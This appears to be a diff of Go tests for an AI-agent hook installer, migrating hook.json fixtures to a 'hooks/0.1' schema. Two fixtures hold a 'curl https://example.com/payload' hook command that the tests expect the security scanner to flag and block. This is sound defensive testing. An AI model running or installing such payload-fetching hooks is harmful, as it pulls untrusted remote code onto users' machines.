@@ -24,9 +24,14 @@ func TestInstallHook_RecordsInInstalledJSON(t *testing.T) {
 	hookDir := filepath.Join(projectRoot, "hooks", "test-hook")
 	os.MkdirAll(hookDir, 0755)
 	hookJSON := `{
-  "event": "PreToolUse",
-  "matcher": ".*",
-  "hooks": [{"type": "command", "command": "echo lint"}]
+  "spec": "hooks/0.1",
+  "hooks": [
+    {
+      "event": "PreToolUse",
+      "matcher": ".*",
+      "handler": {"type": "command", "command": "echo lint"}
+    }
+  ]
 }`
 	hookFile := filepath.Join(hookDir, "hook.json")
 	os.WriteFile(hookFile, []byte(hookJSON), 0644)
@@ -124,9 +129,14 @@ func TestCheckHookStatus_UsesInstalledJSON(t *testing.T) {
 	hookDir := filepath.Join(projectRoot, "hooks", "status-hook")
 	os.MkdirAll(hookDir, 0755)
 	hookJSON := `{
-  "event": "PostToolUse",
-  "matcher": ".*",
-  "hooks": [{"type": "command", "command": "echo status"}]
+  "spec": "hooks/0.1",
+  "hooks": [
+    {
+      "event": "PostToolUse",
+      "matcher": ".*",
+      "handler": {"type": "command", "command": "echo status"}
+    }
+  ]
 }`
 	hookFile := filepath.Join(hookDir, "hook.json")
 	os.WriteFile(hookFile, []byte(hookJSON), 0644)
@@ -185,9 +195,14 @@ func TestParseHookFile_Valid(t *testing.T) {
 	tmpDir := t.TempDir()
 
 	hookJSON := `{
-  "event": "PostToolUse",
-  "matcher": "*.go",
-  "hooks": [{"type": "command", "command": "go test"}]
+  "spec": "hooks/0.1",
+  "hooks": [
+    {
+      "event": "PostToolUse",
+      "matcher": "*.go",
+      "handler": {"type": "command", "command": "go test"}
+    }
+  ]
 }`
 	hookFile := filepath.Join(tmpDir, "hook.json")
 	os.WriteFile(hookFile, []byte(hookJSON), 0644)
@@ -200,11 +215,11 @@ func TestParseHookFile_Valid(t *testing.T) {
 		t.Errorf("event: got %q, want PostToolUse", event)
 	}
 
-	// The event field should be stripped from matcherGroup
+	// parseHookFile returns the provider-shape matcher group, which does NOT
+	// include the event field (that lives on the parent hooks.<event> key).
 	if gjson.GetBytes(matcherGroup, "event").Exists() {
-		t.Error("event field should be stripped from matcher group")
+		t.Error("event field should not appear in matcher group")
 	}
-	// Other fields should remain
 	if gjson.GetBytes(matcherGroup, "matcher").String() != "*.go" {
 		t.Error("matcher field should be preserved")
 	}
@@ -217,7 +232,7 @@ func TestParseHookFile_DirectoryFormat(t *testing.T) {
 	t.Parallel()
 	dir := t.TempDir()
 
-	hookJSON := `{"event":"PreToolUse","matcher":"Bash","hooks":[{"type":"command","command":"echo hi"}]}`
+	hookJSON := `{"spec":"hooks/0.1","hooks":[{"event":"PreToolUse","matcher":"Bash","handler":{"type":"command","command":"echo hi"}}]}`
 	os.WriteFile(filepath.Join(dir, "hook.json"), []byte(hookJSON), 0644)
 
 	event, matcherGroup, err := parseHookFile(dir)
@@ -228,7 +243,7 @@ func TestParseHookFile_DirectoryFormat(t *testing.T) {
 		t.Errorf("event: got %q, want PreToolUse", event)
 	}
 	if gjson.GetBytes(matcherGroup, "event").Exists() {
-		t.Error("event field should be stripped from matcher group")
+		t.Error("event field should not appear in matcher group")
 	}
 	if gjson.GetBytes(matcherGroup, "matcher").String() != "Bash" {
 		t.Error("matcher field should be preserved")
@@ -276,7 +291,7 @@ func TestInstallHook_HashComputation(t *testing.T) {
 	projectRoot := t.TempDir()
 	os.MkdirAll(filepath.Join(projectRoot, ".syllago"), 0755)
 
-	hookJSON := `{"event":"PreToolUse","matcher":"Bash","hooks":[{"type":"command","command":"echo hash-test"}]}`
+	hookJSON := `{"spec":"hooks/0.1","hooks":[{"event":"PreToolUse","matcher":"Bash","handler":{"type":"command","command":"echo hash-test"}}]}`
 
 	// Simulate what installHook does: parse, compute hash, record
 	hookFile := filepath.Join(projectRoot, "hook.json")
@@ -378,7 +393,7 @@ func TestInstallHook_RejectsDuplicate(t *testing.T) {
 
 	hookDir := filepath.Join(projectRoot, "hooks", "dup-hook")
 	os.MkdirAll(hookDir, 0755)
-	hookJSON := `{"event":"PreToolUse","matcher":"Bash","hooks":[{"type":"command","command":"echo dup"}]}`
+	hookJSON := `{"spec":"hooks/0.1","hooks":[{"event":"PreToolUse","matcher":"Bash","handler":{"type":"command","command":"echo dup"}}]}`
 	os.WriteFile(filepath.Join(hookDir, "hook.json"), []byte(hookJSON), 0644)
 
 	item := catalog.ContentItem{
@@ -644,7 +659,7 @@ func TestInstallHook_HighSeverityBlocks(t *testing.T) {
 	hookDir := filepath.Join(projectRoot, "hooks", "dangerous")
 	os.MkdirAll(hookDir, 0755)
 	// Command contains `curl` which the builtin scanner flags as HIGH.
-	hookJSON := `{"event":"PreToolUse","matcher":"Bash","hooks":[{"type":"command","command":"curl https://example.com/payload"}]}`
+	hookJSON := `{"spec":"hooks/0.1","hooks":[{"event":"PreToolUse","matcher":"Bash","handler":{"type":"command","command":"curl https://example.com/payload"}}]}`
 	os.WriteFile(filepath.Join(hookDir, "hook.json"), []byte(hookJSON), 0644)
 
 	item := catalog.ContentItem{
@@ -671,7 +686,7 @@ func TestInstallHook_ForceBypassesScan(t *testing.T) {
 
 	hookDir := filepath.Join(projectRoot, "hooks", "forced")
 	os.MkdirAll(hookDir, 0755)
-	hookJSON := `{"event":"PreToolUse","matcher":"Bash","hooks":[{"type":"command","command":"curl https://example.com/x"}]}`
+	hookJSON := `{"spec":"hooks/0.1","hooks":[{"event":"PreToolUse","matcher":"Bash","handler":{"type":"command","command":"curl https://example.com/x"}}]}`
 	os.WriteFile(filepath.Join(hookDir, "hook.json"), []byte(hookJSON), 0644)
 
 	item := catalog.ContentItem{
@@ -695,7 +710,7 @@ func TestInstallHook_MediumSeverityDoesNotBlock(t *testing.T) {
 
 	hookDir := filepath.Join(projectRoot, "hooks", "mid")
 	os.MkdirAll(hookDir, 0755)
-	hookJSON := `{"event":"PreToolUse","matcher":"Bash","hooks":[{"type":"command","command":"chmod 755 build.sh"}]}`
+	hookJSON := `{"spec":"hooks/0.1","hooks":[{"event":"PreToolUse","matcher":"Bash","handler":{"type":"command","command":"chmod 755 build.sh"}}]}`
 	os.WriteFile(filepath.Join(hookDir, "hook.json"), []byte(hookJSON), 0644)
 
 	item := catalog.ContentItem{
@@ -720,7 +735,7 @@ func TestInstallHook_CleanHookInstalls(t *testing.T) {
 
 	hookDir := filepath.Join(projectRoot, "hooks", "clean")
 	os.MkdirAll(hookDir, 0755)
-	hookJSON := `{"event":"PreToolUse","matcher":"Bash","hooks":[{"type":"command","command":"echo hello"}]}`
+	hookJSON := `{"spec":"hooks/0.1","hooks":[{"event":"PreToolUse","matcher":"Bash","handler":{"type":"command","command":"echo hello"}}]}`
 	os.WriteFile(filepath.Join(hookDir, "hook.json"), []byte(hookJSON), 0644)
 
 	item := catalog.ContentItem{
